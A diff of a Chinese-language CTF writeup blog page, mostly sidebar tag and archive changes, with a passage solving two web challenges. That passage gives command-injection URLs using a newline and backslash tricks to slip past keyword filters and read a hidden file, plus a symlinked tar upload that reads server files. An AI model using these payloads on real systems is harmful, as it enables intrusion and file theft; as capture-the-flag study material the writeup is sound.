@@ -263,6 +263,8 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
 </div>
                 
                 
@@ -425,7 +427,7 @@ height:50vh;
 <h3 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h3><p>题目比较坑，一开始以为是注入，后来发现是命令注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://game.sycsec.com:2012/?name=%0apwd</span><br><span class="line">回显</span><br><span class="line">你的名字是: /var/www/html</span><br></pre></td></tr></table></figure></p>
 <p>然后发现大量指令都被过滤了，学习了一波bash小特性的绕过<br>发现<code>\</code>可以绕过关键词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://game.sycsec.com:2012/?name=%0al\s</span><br><span class="line">回显</span><br><span class="line">你的名字是: index.php</span><br></pre></td></tr></table></figure></p>
 <p>然后就很痛苦，找了很久没找到flag，后来猜想是不是用了隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://game.sycsec.com:2012/?name=%0afin\d%09</span><br><span class="line">回显</span><br><span class="line">你的名字是: . ./.YoufindMeButYouCanN0tReadMe.swp ./index.php</span><br></pre></td></tr></table></figure></p>
-<p>然后cat获取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://game.sycsec.com:2012/?name=%0aca\t%09.Youfin\dMeButYouCanN0tReadMe.swp</span><br><span class="line">回显</span><br><span class="line">你的名字是: </span><br><span class="line">b0VIM 7.4�jrootiZwz9aqtiwio4jjeu737peZ/var/www/html/YoufindMeButYouCanN0tReadMe U3210#&quot;! Utpad���SYC&#123;Wo_ai_he_kou_jue_jiu&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后cat获取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://game.sycsec.com:2012/?name=%0aca\t%09.Youfin\dMeButYouCanN0tReadMe.swp</span><br><span class="line">回显</span><br><span class="line">你的名字是: </span><br><span class="line">b0VIM 7.4�jrootiZwz9aqtiwio4jjeu737peZ/var/www/html/YoufindMeButYouCanN0tReadMe U3210#&quot;! Utpad���SYC&#123;Wo_ai_he_kou_jue_jiu&#125;</span><br></pre></td></tr></table></figure></p>
 <h3 id="快捷方式的妙用"><a href="#快捷方式的妙用" class="headerlink" title="快捷方式的妙用"></a>快捷方式的妙用</h3><p>题目title很明显告诉你了是tar<br>所以应该是上传tar包，他会解压你的tar，然后cat你的解压文件<br>所以思路很清晰了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/upload.php sky.txt</span><br><span class="line">tar -cf sky.tar sky.txt</span><br></pre></td></tr></table></figure></p>
 <p>可以映射他的upload.php到sky.txt然后压缩成tar，再上传，即可获取源码<br>然后获得flag路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/flag_is_here_hahaha sky.txt</span><br><span class="line">tar -cf sky.tar sky.txt</span><br></pre></td></tr></table></figure></p>
 <p>然后再次上传后获取flag：<code>SYC{Bust_1inK!!!}</code></p>
@@ -580,6 +582,62 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -3872,22 +3930,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -3902,53 +3960,55 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="CRC"><span class="iconfont-archer">&#xe606;</span>CRC</span>
-    
-        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
+        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
+        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
-        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
-    
-        <span class="sidebar-tag-name" data-tags="php_black_magic"><span class="iconfont-archer">&#xe606;</span>php_black_magic</span>
+        <span class="sidebar-tag-name" data-tags="其他"><span class="iconfont-archer">&#xe606;</span>其他</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
+    
+        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
+    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
-        <span class="sidebar-tag-name" data-tags=".git"><span class="iconfont-archer">&#xe606;</span>.git</span>
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="ShadowSocks"><span class="iconfont-archer">&#xe606;</span>ShadowSocks</span>
+        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="学业"><span class="iconfont-archer">&#xe606;</span>学业</span>
     
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
     
-        <span class="sidebar-tag-name" data-tags=".htaccess"><span class="iconfont-archer">&#xe606;</span>.htaccess</span>
+        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
     
-        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
-        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
-    
-        <span class="sidebar-tag-name" data-tags="心情随笔"><span class="iconfont-archer">&#xe606;</span>心情随笔</span>
-    
-        <span class="sidebar-tag-name" data-tags="计网考试"><span class="iconfont-archer">&#xe606;</span>计网考试</span>
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
         <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
     
@@ -3956,23 +4016,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup.crypto"><span class="iconfont-archer">&#xe606;</span>writeup.crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="websummary"><span class="iconfont-archer">&#xe606;</span>websummary</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验"><span class="iconfont-archer">&#xe606;</span>微机实验</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机考试"><span class="iconfont-archer">&#xe606;</span>微机考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="马原考试"><span class="iconfont-archer">&#xe606;</span>马原考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验考试"><span class="iconfont-archer">&#xe606;</span>微机实验考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
-    
-        <span class="sidebar-tag-name" data-tags="algorithm"><span class="iconfont-archer">&#xe606;</span>algorithm</span>
+        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -4027,9 +4075,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="awd"><span class="iconfont-archer">&#xe60a;</span>awd</span>
     
-        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
-    
         <span class="sidebar-category-name" data-categories="计网考试"><span class="iconfont-archer">&#xe60a;</span>计网考试</span>
+    
+        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
     
         <span class="sidebar-category-name" data-categories="flask"><span class="iconfont-archer">&#xe60a;</span>flask</span>
     
